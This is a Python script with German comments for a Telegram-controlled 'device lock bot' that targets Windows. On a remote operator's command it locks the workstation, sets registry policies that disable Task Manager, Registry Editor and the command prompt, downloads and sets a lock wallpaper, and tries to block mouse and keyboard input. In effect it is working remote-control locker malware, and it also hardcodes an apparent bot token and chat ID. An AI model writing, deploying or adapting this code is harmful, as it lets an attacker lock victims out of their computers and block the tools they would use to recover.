#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
geraet_sperren.py - Gerätesperre über Telegram
Nur ein Telegram Bot Token
"""

import os
import sys
import subprocess
import ctypes
import telebot
from telebot import types
import time
import platform

# ==================== KONFIGURATION ====================
BOT_TOKEN = "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo"  # Spezieller Bot für Sperren
MASTER_ID = "6976176725"

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== LOCK FUNCTIONS ====================
def lock_windows():
    """Sperrt Windows"""
    try:
        ctypes.windll.user32.LockWorkStation()
        return "✅ Windows gesperrt"
    except:
        return "❌ Konnte Windows nicht sperren"

def disable_task_manager():
    """Deaktiviert Task Manager"""
    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        return "✅ Task Manager deaktiviert"
    except:
        return "⚠️ Task Manager deaktivierung fehlgeschlagen"

def disable_registry():
    """Deaktiviert Registry Editor"""
    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        return "✅ Registry Editor deaktiviert"
    except:
        return "⚠️ Registry deaktivierung fehlgeschlagen"

def disable_cmd():
    """Deaktiviert Command Prompt"""
    try:
        key = r"Software\Policies\Microsoft\Windows\System"
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "DisableCMD", 0, winreg.REG_DWORD, 1)
        return "✅ CMD deaktiviert"
    except:
        return "⚠️ CMD deaktivierung fehlgeschlagen"

def set_custom_wallpaper(message):
    """Setzt benutzerdefinierten Hintergrund"""
    try:
        # Hier URL zu Sperrbild
        url = "https://example.com/lock_image.jpg"
        path = r"C:\Windows\Web\Wallpaper\locked.jpg"
        
        import urllib.request
        urllib.request.urlretrieve(url, path)
        
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return f"✅ Hintergrund gesetzt: {message}"
    except:
        return "❌ Hintergrund konnte nicht gesetzt werden"

def full_device_lock():
    """Komplette Gerätesperre"""
    results = []
    results.append(lock_windows())
    results.append(disable_task_manager())
    results.append(disable_registry())
    results.append(disable_cmd())
    return "\n".join(results)

# ==================== TELEGRAM COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🔒 Lock Windows')
    btn2 = types.KeyboardButton('⚙️ Disable Task Manager')
    btn3 = types.KeyboardButton('📝 Disable Registry')
    btn4 = types.KeyboardButton('💻 Disable CMD')
    btn5 = types.KeyboardButton('🖼️ Set Lock Wallpaper')
    btn6 = types.KeyboardButton('💀 FULL DEVICE LOCK')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(message.chat.id,
                    "🔐 **DEVICE LOCK BOT** 🔐\n"
                    f"System: {platform.system()}",
                    parse_mode='Markdown',
                    reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    text = message.text
    
    if text == '🔒 Lock Windows':
        result = lock_windows()
        bot.send_message(message.chat.id, result)
    
    elif text == '⚙️ Disable Task Manager':
        result = disable_task_manager()
        bot.send_message(message.chat.id, result)
    
    elif text == '📝 Disable Registry':
        result = disable_registry()
        bot.send_message(message.chat.id, result)
    
    elif text == '💻 Disable CMD':
        result = disable_cmd()
        bot.send_message(message.chat.id, result)
    
    elif text == '🖼️ Set Lock Wallpaper':
        msg = bot.send_message(message.chat.id, "Gib Nachricht für Sperrbild:")
        bot.register_next_step_handler(msg, process_wallpaper)
    
    elif text == '💀 FULL DEVICE LOCK':
        msg = bot.send_message(message.chat.id,
                              "💀 **KOMPLETTE GERÄTESPERRE** 💀\n"
                              "Bestätige mit 'LOCKDOWN'",
                              parse_mode='Markdown')
        bot.register_next_step_handler(msg, confirm_lockdown)

def process_wallpaper(message):
    result = set_custom_wallpaper(message.text)
    bot.send_message(message.chat.id, result)

def confirm_lockdown(message):
    if message.text.upper() == 'LOCKDOWN':
        bot.send_message(message.chat.id, "💀 STARTE KOMPLETTE SPERRE...")
        result = full_device_lock()
        bot.send_message(message.chat.id, result)
        
        # Zusätzlich: Maus und Tastatur sperren (experimentell)
        try:
            subprocess.run('rundll32.exe user32.dll,BlockInput', shell=True)
            bot.send_message(message.chat.id, "✅ Maus/Tastatur gesperrt")
        except:
            pass
    else:
        bot.send_message(message.chat.id, "❌ Abgebrochen")

# ==================== MAIN ====================
def main():
    print("😈 Device Lock Bot gestartet")
    
    try:
        bot.send_message(MASTER_ID, "✅ Device Lock Bot aktiv")
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"❌ Fehler: {e}")
        time.sleep(10)
        main()

if __name__ == "__main__":
    if BOT_TOKEN == "DEIN_BOTHIRN_TOKEN_HIER":
        print("❌ Token nicht gesetzt!")
        sys.exit(1)
    
    # Windows-spezifische Imports
    if platform.system() == "Windows":
        import winreg
    else:
        print("⚠️ Nur für Windows geeignet")
    
    main()
